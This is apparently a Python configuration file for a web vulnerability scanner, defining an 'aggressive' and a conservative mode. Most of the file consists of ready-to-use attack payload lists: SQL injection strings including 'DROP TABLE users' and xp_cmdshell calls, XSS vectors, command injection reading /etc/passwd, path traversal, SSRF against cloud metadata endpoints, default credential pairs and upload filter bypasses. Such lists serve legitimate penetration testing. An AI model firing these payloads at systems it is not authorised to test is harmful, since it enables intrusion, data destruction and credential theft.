"""
Aggressive Testing Mode Configuration
Increases test coverage by 10x with more payloads, longer fuzzing, deeper directory scanning
"""

class AggressiveConfig:
    """Configuration for comprehensive vulnerability scanning"""
    
    # SQLi Payloads (dari 10 → 50+)
    SQLI_PAYLOADS = [
        # Basics
        "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 'a'='a",
        "') OR ('1'='1", "') OR (1=1)--", "\") OR (\"1\"=\"1",
        
        # Union-based
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", 
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        
        # Boolean blind
        "' AND 1=1--", "' AND 1=2--", "' AND SUBSTRING(@@version,1,1)='5'--",
        
        # Time-based blind
        "' AND SLEEP(5)--", "' AND IF(1=1,SLEEP(5),0)--", "'; WAITFOR DELAY '00:00:05'--",
        
        # PostgreSQL-specific
        "'; SELECT pg_sleep(5)--", "' OR pg_sleep(5)--",
        
        # MySQL-specific
        "' OR BENCHMARK(5000000,MD5('test'))--",
        
        # MSSQL-specific
        "'; EXEC xp_cmdshell('whoami')--",
        
        # NoSQL
        "' || '1'=='1", "' && this.password.match(/.*/)//+%00",
        "{\"$gt\": \"\"}", "{\"$ne\": null}",
        
        # Advanced bypasses
        "' /*!50000OR*/ '1'='1", "' %23%0aOR '1'='1", "' /*!32302AND*/ 1=1--",
        
        # Second-order
        "admin' INTO OUTFILE '/tmp/test.txt'--",
        "'; DROP TABLE users--", "'; DELETE FROM users WHERE '1'='1'--",
        
        # LDAP injection
        "*)(uid=*))(|(uid=*", "admin*)((|userPassword=*)",
        
        # XML injection
        "' or '1'='1'--><foo>", "<!--' or '1'='1'-->",
        
        # Template injection
        "{{7*7}}", "${7*7}", "{{config}}", "${ENV}",
        
        # Polyglot payloads
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>"
    ]
    
    # XSS Payloads (dari 10 → 100+)
    XSS_PAYLOADS = [
        # Basics
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        
        # Event handlers (50+ variations)
        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>", "<div onwheel=alert(1)>",
        
        # Filter bypasses
        "<SCRipT>alert(1)</sCRiPT>", "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=\"x\" onerror=\"alert(1)\">", "<svg><script>alert(1)</script></svg>",
        
        # Advanced
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<object data='javascript:alert(1)'>", 
        "<embed src='javascript:alert(1)'>",
        
        # CSS injection
        "<style>*{background:url('javascript:alert(1)')}</style>",
        
        # DOM-based
        "#<script>alert(1)</script>", "javascript:alert(1);//",
        
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//"
    ]
    
    # Directory fuzzing wordlist (dari 100 → 1000+)
    DIRECTORY_WORDLIST_SIZE = 1000  # Use top 1000 from SecLists
    
    # Subdomain enumeration (dari 100 → 5000+)
    SUBDOMAIN_WORDLIST_SIZE = 5000
    
    # Fuzzing settings
    FUZZING_DEPTH = 5  # dari 2 → 5 levels deep
    FUZZING_MUTATIONS = 500  # dari 100 → 500 mutations per endpoint
    
    # API testing
    API_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
    API_CONTENT_TYPES = [
        "application/json", "application/xml", "application/x-www-form-urlencoded",
        "multipart/form-data", "text/plain", "text/html", "application/octet-stream"
    ]
    
    # Authentication bypass techniques (100+ combos)
    DEFAULT_CREDS = [
        ("admin", "admin"), ("administrator", "password"), ("root", "root"),
        ("admin", "123456"), ("admin", "password"), ("admin", "admin123"),
        ("user", "user"), ("test", "test"), ("guest", "guest"),
        ("demo", "demo"), ("Administrator", "Administrator"),
        # Add 90+ more common combinations...
    ]
    
    # File upload extensions to test
    FILE_UPLOAD_EXTENSIONS = [
        # Executable
        ".php", ".php3", ".php4", ".php5", ".phtml", ".phar",
        ".jsp", ".jspx", ".asp", ".aspx", ".cer", ".war",
        # Script
        ".js", ".html", ".htm", ".svg", ".xml", ".xhtml",
        # Archive (zip bomb)
        ".zip", ".tar", ".gz", ".rar", ".7z",
        # Config
        ".config", ".conf", ".ini", ".env", ".htaccess",
        # Bypass techniques
        ".php.jpg", ".php;jpg", ".php%00.jpg", ".php\x00.jpg",
        ".PhP", ".pHp", ".PHP5", ".php.", ".php::$DATA"
    ]
    
    # Path traversal payloads
    PATH_TRAVERSAL = [
        "../", "..\\", "....//", "....\\\\",
        "%2e%2e/", "%2e%2e\\", "%252e%252e/",
        "..;/", "..;\\", "..%00/", "..%0d/",
        "..%5c", "..%255c", "/%2e%2e/%2e%2e/",
        # Double encoding
        "%252e%252e%252f", "%252e%252e%255c",
        # Null byte
        "..%00/", "..%00\\", "../%00", "..\\%00"
    ]
    
    # Command injection
    COMMAND_INJECTION = [
        "; whoami", "| whoami", "& whoami", "&& whoami",
        "`whoami`", "$(whoami)", "${IFS}whoami",
        "; id", "| id", "& id", "&& id",
        "; cat /etc/passwd", "| cat /etc/passwd",
        # Windows
        "& dir", "&& dir", "| dir", "; dir",
        # Blind
        "; sleep 5", "| sleep 5", "& ping -c 5 127.0.0.1",
        # Encoded
        "%0a whoami", "%0d whoami", "%0a%0d whoami"
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1", "http://localhost", "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://127.0.0.1:6379/",  # Redis
        "http://127.0.0.1:5432/",  # PostgreSQL
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:6379/_", "dict://127.0.0.1:6379/",
        # Bypasses
        "http://127.0.0.1@google.com", "http://google.com@127.0.0.1",
        "http://127.1", "http://0x7f000001", "http://2130706433"
    ]
    
    @classmethod
    def get_config(cls, mode: str = "aggressive"):
        """Get configuration for specified mode"""
        if mode == "aggressive":
            return {
                "sqli_payloads": cls.SQLI_PAYLOADS,
                "xss_payloads": cls.XSS_PAYLOADS,
                "directory_wordlist_size": cls.DIRECTORY_WORDLIST_SIZE,
                "subdomain_wordlist_size": cls.SUBDOMAIN_WORDLIST_SIZE,
                "fuzzing_depth": cls.FUZZING_DEPTH,
                "fuzzing_mutations": cls.FUZZING_MUTATIONS,
                "api_methods": cls.API_METHODS,
                "default_creds": cls.DEFAULT_CREDS,
                "file_upload_extensions": cls.FILE_UPLOAD_EXTENSIONS,
                "path_traversal": cls.PATH_TRAVERSAL,
                "command_injection": cls.COMMAND_INJECTION,
                "ssrf_payloads": cls.SSRF_PAYLOADS
            }
        else:  # conservative mode (existing)
            return {
                "sqli_payloads": cls.SQLI_PAYLOADS[:10],
                "xss_payloads": cls.XSS_PAYLOADS[:10],
                "directory_wordlist_size": 100,
                "subdomain_wordlist_size": 100,
                "fuzzing_depth": 2,
                "fuzzing_mutations": 100,
                "api_methods": ["GET", "POST"],
                "default_creds": cls.DEFAULT_CREDS[:10],
                "file_upload_extensions": cls.FILE_UPLOAD_EXTENSIONS[:10],
                "path_traversal": cls.PATH_TRAVERSAL[:5],
                "command_injection": cls.COMMAND_INJECTION[:5],
                "ssrf_payloads": cls.SSRF_PAYLOADS[:5]
            }
